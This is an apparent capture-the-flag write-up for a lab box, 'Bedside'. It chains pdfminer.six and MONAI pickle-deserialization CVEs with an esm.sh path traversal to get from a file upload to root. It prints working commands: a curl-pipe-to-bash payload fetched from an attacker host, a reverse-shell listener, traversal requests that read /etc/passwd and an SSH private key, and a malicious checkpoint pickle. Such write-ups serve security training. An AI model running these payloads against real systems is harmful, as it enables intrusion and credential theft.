# Bedside

## Engagement Notes

Bedside is a Linux box themed as a cardiology clinic whose "AI research" backend
is the whole game: two separate insecure-deserialization bugs in medical-imaging
Python tooling, bridged by a directory-traversal SSH-key theft. The front door is
a file-upload "research portal" powered by **pdfminer.six**, which parses
uploaded PDFs and can be tricked — via a polyglot PDF/pickle file
([CVE-2025-64512](https://github.com/advisories/GHSA-wf5f-4jwr-ppcp)) — into
deserializing an attacker-controlled pickle, landing a shell inside a data-
processing **container** as `datawrangler`. From there an internal-only port
running `esm.sh serve` is directory-traversable, which reads the host user
`developer`'s private key straight off disk. The root step is a sudo-able MONAI
trainer that loads model checkpoints with MONAI's `CheckpointLoader`
([CVE-2025-58756](https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-6vm5-6jv9-rjpj))
— unsafe deserialization again — where the decisive observation is a **capability
split across the two footholds**: the container user can write the checkpoint
directory but can't run the trainer, and the host user can run the trainer but
can't write the directory. Plant as one, trigger as the other.

The habit this box rewards is stepping back to re-enumerate after a first idea
stalls (the winning pdfminer.six lead was a response header sitting in plain
sight while a filename-injection idea was being forced), and reading permission
deltas between users as an attack surface rather than a nuisance.

## Attack path

1. **Recon** → `bedside.htb` (10.129.38.212) exposes 22 (SSH) and 80 (Apache).
   The main site is a static clinic brochure; content discovery is cut short in
   favour of a vhost sweep.
2. **Vhost** → `gobuster vhost` finds **research.bedside.htb**, a file-upload
   "Bedside Research Portal" whose response header reads
   `X-Powered-By: pdfminer.six`.
3. **Upload dead-ends** → zip/zipslip and PHP-in-filename tricks get files stored
   but never executed; one rejection leaks the absolute upload path
   `/var/www/research.bedside.htb/uploads`.
4. **pdfminer.six RCE** → the `pdfminer.six` header points at **CVE-2025-64512**;
   a polyglot PDF + gzipped-pickle pair uploaded to the portal is parsed by a
   backend watcher and deserialized.
5. **Container foothold** → the pickle runs a reverse shell, caught as
   **`datawrangler`** (uid 988, group `dataops`) inside a Docker container with a
   shared `/datastore` volume.
6. **Internal port 3000** → a `/dev/tcp` port sweep from the container finds host
   port 3000: an `esm.sh serve` React "Image Viewer" running as **developer**,
   reached locally via a meterpreter `portfwd`.
7. **esm.sh traversal → key theft** → URL-encoded `..%2F` sequences read
   arbitrary files: `/etc/passwd`, `user.txt`, and `developer`'s
   `.ssh/id_rsa`.
8. **SSH as developer** → the stolen key logs into the **host** as `developer`.
9. **sudo MONAI CheckpointLoader → root** → `developer` may `sudo` a MONAI
   trainer that loads the newest `/datastore/checkpoints/*.pt`
   (**CVE-2025-58756**). The container user writes a malicious checkpoint into
   that shared directory (which `developer` can't write); `developer` runs the
   trainer under sudo (which the container user can't do) → **root**.

## Foothold — pdfminer.six polyglot deserialization

The first idea was to smuggle executable code through the upload's filename. The
uploads land in a browsable directory but stay raw (`shelf-bigger.zip` downloads
back byte-for-byte), and a PHP-in-filename attempt (`(whoami).zip` carrying an
appended `<?=` `$_GET[0]` `?>`) uploads but never renders. A stricter attempt
even trips a MIME check whose error hands back the exact destination path:

```console
$ # filename-injection attempt — stored, never executed
File uploaded successfully: .zip

$ # a stricter attempt trips the MIME check and leaks the upload path
MIME type mismatch. Unable to upload file to destination /var/www/research.bedside.htb/uploads
```

> 🧠 That "dead-end" was load-bearing. Its error message printed the absolute
> upload path, `/var/www/research.bedside.htb/uploads`, which is exactly the
> location the real exploit needed to point its payload at — and the box notes
> left on the portal confirmed it as the intended path.

With filename tricks abandoned, the `X-Powered-By: pdfminer.six` header became the
lead. pdfminer.six's `CMapDB._load_data()` deserializes a pickle referenced from
a PDF's font-encoding section with `pickle.loads()`
([CVE-2025-64512](https://github.com/advisories/GHSA-wf5f-4jwr-ppcp), CWE-502,
affected `< 20251107`). luigigubello's public PoC builds the polyglot — a pickle,
gzip-wrapped, with a full PDF embedded in the gzip comment field — and takes the
in-PDF path plus the command to run:

```console
$ cd payloads; python CVE-2025-64512.py --path '#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fpayload' -c 'curl http://10.10.17.14:9998/revshell.sh | bash'
PoC Payload: payload.pickle.gz
%PDF offset found:  115
```

> 🧠 Reaching the pdfminer.six lead was a deliberate reset. Time had gone into
> forcing the filename-manipulation assumption; stepping back to re-enumerate
> from scratch surfaced the response header as the thing worth chasing, and it
> came with a ready-made PoC.

Both halves of the polyglot — the PDF and the gzipped pickle — are uploaded to the
portal:

```console
$ # upload payload.pdf and payload.pickle.gz to research.bedside.htb
File uploaded successfully: payload.pdf
File uploaded successfully: payload.pickle.gz
```

No further interaction was needed — a backend watcher picked the PDF up on its
own and the shell arrived:

```console
$ nc -lvn 9997
Listening on 0.0.0.0 9997
Connection received on 10.129.38.212 60420
datawrangler@data-wrangler:/app$ id
uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)
```

> 🧠 The shell arriving unprompted was the surprise. The expectation was that
> browsing to the uploaded PDF would trigger parsing; seeing the callback fire
> with no such request implied a server-side job was polling the upload
> directory — later confirmed as a cron-like watcher.

That watcher is `/app/pdf_watcher.py`: it polls the upload directory every 30
seconds and runs `pdf2txt.py` (pdfminer.six's CLI) on every `*.pdf`, writing text
into `/datastore/staging` — the trigger that deserializes the polyglot.

```python
# /app/pdf_watcher.py (excerpt)
UPLOAD_DIR = "/var/www/research.bedside.htb/uploads"
OUTPUT_DIR = "/datastore/staging"
SLEEP_INTERVAL = 30
...
        subprocess.run(["pdf2txt.py", pdf_path, "-o", output_file], timeout=TIMEOUT, check=True)
```

## Pivot — internal port 3000 and an esm.sh traversal

This is a container (`overlay` root, Docker mounts), Debian 13, with a shared
`/datastore` volume holding an ML pipeline's directories
(`checkpoints/logs/models/processed/raw/staging`). `netstat`/`ss` are absent, so
a self-contained bash `/dev/tcp` port scanner dropped in `/tmp` sweeps the host
and finds a third port not seen from outside:

```console
datawrangler@data-wrangler:/tmp$ bash portscan.sh 10.129.38.212
Open ports on 10.129.38.212:
22
80
3000
```

Port 3000 is a "Bedside Clinic - Image Viewer" React app; `/proc/self/cmdline`
(read shortly after) shows it is served by `esm.sh serve .`, running as the host
user `developer`. Rather than poke it through the container's thin shell, a
meterpreter session (delivered via the same pdfminer.six CVE) forwards the port
back for local tooling:

```console
meterpreter > portfwd add -l 3000 -p 3000 -r 10.129.38.212
[*] Forward TCP relay created: (local) :3000 -> (remote) 10.129.38.212:3000
```

> 🧠 The port-forward wasn't strictly necessary — the container could already
> reach `10.129.38.212:3000` — but the service was an unknown quantity and
> enumerating it through a weak shell was unappealing; meterpreter's forward put
> local tools directly against it.

`esm.sh serve`'s static handler honours URL-encoded traversal sequences, so
`..%2F` chains walk straight out of the served directory to arbitrary files:

```console
$ curl http://localhost:3000/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc%2Fpasswd
root:x:0:0:root:/root:/bin/bash
...
developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
datawrangler:x:988:1001::/home/datawrangler:/bin/sh
...
```

> 🧠 Directory traversal was the first thing tried because esm.sh's GitHub issue
> tracker is full of LFI reports of exactly this shape — so it was a "try it and
> see," and it landed immediately.

`/proc/self/cmdline` and `/proc/self/environ` confirm what's serving and as whom,
and the same traversal reads the user flag and `developer`'s SSH private key
directly:

```console
$ curl http://localhost:3000/..%2F...%2F%2Fproc%2Fself%2Fcmdline --output -
/usr/bin/esm.sh serve .

$ curl http://localhost:3000/..%2F...%2F%2Fproc%2Fself%2Fenviron --output -
... USER=developer LOGNAME=developer HOME=/home/developer SHELL=/bin/bash ...

$ curl http://localhost:3000/..%2F...%2F%2Fhome%2Fdeveloper%2Fuser.txt
716a2fd9fa26eb267344e23a74650a18

$ curl http://localhost:3000/..%2F...%2F%2Fhome%2Fdeveloper%2F.ssh%2fid_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW…
-----END OPENSSH PRIVATE KEY-----
```

The key logs straight into the host as `developer`:

```console
$ ssh developer@bedside.htb -i developer.rsa
...
Linux bedside 6.12.95+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.95-1 (2026-07-04) x86_64
developer@bedside:~$
```

## Privilege escalation — MONAI CheckpointLoader across two accounts

`developer` may run one command as root without a password — a MONAI medical-
imaging trainer:

```console
developer@bedside:~$ sudo -l
User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

The trainer's relevant behaviour: if `PROCESSED_DIR` is empty it promotes files
from `/datastore/staging`, and only if it then has training data does it reach
its checkpoint-resume path — which loads the newest `/datastore/checkpoints/*.pt`
through MONAI's `CheckpointLoader`:

```python
# /opt/trainer/bedside_trainer.py (excerpts)
from monai.handlers import CheckpointLoader
...
    dataloader, n_data = prepare_dataloader_from_processed(PROCESSED_DIR, BATCH_SIZE)
    if n_data == 0:
        promoted = conservative_promote_from_staging(STAGING_DIR, PROCESSED_DIR, max_files=200)
        ...
        else:
            logger.warning("No data available to train. Exiting.")
            return
    ...
    latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
    if latest_ckpt:
        loader = CheckpointLoader(load_path=str(latest_ckpt),
            load_dict={"model": model, "optimizer": optimizer}, map_location=DEVICE)
        ...
        loader(engine)  # invoke the handler directly
```

MONAI 1.5.0 is installed, and `CheckpointLoader` on `≤ 1.5.0` deserializes
checkpoints unsafely
([CVE-2025-58756](https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-6vm5-6jv9-rjpj),
CWE-502, patched in 1.5.1) — a `.pt` file is a pickle, so a crafted checkpoint
runs code the instant it's loaded. The catch is *who can do what*:
`/datastore/checkpoints` is `drwxrwx--- 988:1001` — owned by `datawrangler`,
group `dataops`:

```console
datawrangler@data-wrangler:/datastore$ ls -alhn
drwxrwx--- 2 988 1001 4.0K Jul 13 13:00 checkpoints
...
```

`developer` is uid 1000 and in neither — so `developer` can *run* the trainer as
root but **can't write the checkpoint it loads**, while `datawrangler` **can
write the checkpoint but can't run the trainer**. The two footholds complete each
other.

> 🧠 The permission listing is what made the path obvious. `datawrangler` turning
> out to be defined on *both* the container and the host `/datastore` was the
> unexpected part; once it was clear `developer` shared no overlapping write
> access to the checkpoint directory, the container-writes / host-triggers
> handoff was the only shape that fit.

A malicious checkpoint is generated locally — a pickle whose `__reduce__` spawns a
shell — and served from the attacker box:

```python
class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ('/bin/bash',))

torch.save({'model_state_dict': MaliciousPayload(), 'optimizer_state_dict': {}, 'epoch': 100},
           "payloads/cp.pt")
```

From the `datawrangler` shell, the pipeline directories are reset, one benign
image is dropped into `staging/` to get the trainer past its "no data → exit"
guard, and the malicious `cp.pt` is pulled into `checkpoints/`:

```console
datawrangler@data-wrangler:/datastore$ rm staging/* processed/* checkpoints/checkpoint_*; cp corn.jpg staging/corn.jpg; curl -O http://10.10.17.14:9998/cp.pt; cp cp.pt checkpoints/cp.pt
```

> 🧠 The throwaway image is deliberate: `pdf2txt` staging left text files that
> made the trainer's image loader (PIL) error out, so `staging/` was cleared and
> seeded with a single loadable image — enough to satisfy the `n_data == 0`
> guard and carry execution through to the checkpoint load.

Running the trainer under sudo promotes the image, reaches the checkpoint step,
and deserializes the payload as root:

```console
developer@bedside:/opt/trainer$ sudo python3 /opt/trainer/bedside_trainer.py
... | INFO | Promoted 1 files from staging -> processed
... | INFO | Using 1 samples for training.
... | INFO | Found checkpoint /datastore/checkpoints/cp.pt, loading with CheckpointLoader (callable mode)...
root@bedside:/opt/trainer# cat /root/root.txt
40f7c98358baa44aee66d289f3fe24cf
```

> 🧠 Reverse shells from the payload kept failing (nothing spawned, permission
> errors), so the payload simply dropped into `/bin/bash` on the existing sudo
> tty — an interactive root shell was the most reliable way to stay root.

## What didn't work

- **Filename / zip-based code injection on the upload portal.** Uploads are
  browsable but stored raw; zipslip and a PHP-in-filename payload both uploaded
  without ever executing. The attempt wasn't wasted, though — its MIME-mismatch
  error leaked the absolute upload path the pdfminer.six exploit then targeted.
- **Reverse shells at the root stage.** Multiple attempts from the checkpoint
  payload failed to spawn or hit permission errors; a plain `os.system('/bin/bash')`
  on the sudo tty was enough to hold root, so the reverse-shell route was dropped.

## Tactics (MITRE ATT&CK)

Only techniques whose definition matches what happened, each verified against its
ATT&CK page:

| Technique | ID | Where |
|---|---|---|
| Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190/) | The research portal's PDF upload → pdfminer.six pickle deserialization (CVE-2025-64512) for initial access |
| Command and Scripting Interpreter: Unix Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | Both deserialization payloads execute via `os.system` (`curl … | bash`, `/bin/bash`) |
| Ingress Tool Transfer | [T1105](https://attack.mitre.org/techniques/T1105/) | `curl` pulls of `revshell.sh`, the meterpreter ELF, and `cp.pt` from the attacker HTTP server on `:9998` |
| Unsecured Credentials: Private Keys | [T1552.004](https://attack.mitre.org/techniques/T1552/004/) | `developer`'s `~/.ssh/id_rsa` read off disk through the esm.sh traversal |
| Remote Services: SSH | [T1021.004](https://attack.mitre.org/techniques/T1021/004/) | Logging into the host as `developer` with the stolen private key |
| Sudo and Sudo Caching | [T1548.003](https://attack.mitre.org/techniques/T1548/003/) | Abusing `NOPASSWD: … bedside_trainer.py` to run the CheckpointLoader deserialization as root |

> **Not tagged, and why:** the two core bugs are insecure deserialization
> ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) — pdfminer.six's
> `pickle.loads` and MONAI's `CheckpointLoader` — but CWE-502 has no dedicated
> ATT&CK technique of its own; what's tagged is the *execution* each one yields,
> under T1059.004. The esm.sh directory traversal likewise has no clean ATT&CK ID
> as a technique (it's the mechanism behind the T1552.004 key theft, which is
> what's tagged).

## Lessons

- **Step back and re-enumerate when an assumption stalls.** The whole foothold
  hinged on the `X-Powered-By: pdfminer.six` header, which was sitting in plain
  sight while time went into forcing a filename-injection idea. Re-running
  enumeration from scratch — rather than doubling down — is what surfaced it.
- **Read permission deltas between users as the map.** The root path wasn't a
  single-user misconfiguration; it was the *split* — one account can write what
  another can execute. Diffing what each foothold can and can't touch turned two
  partial positions into one full chain.
- **A "failed" attempt can still be recon.** The upload dead-end never executed
  code, but its error message handed over the exact server path the real exploit
  needed. Read every rejection for what it leaks.
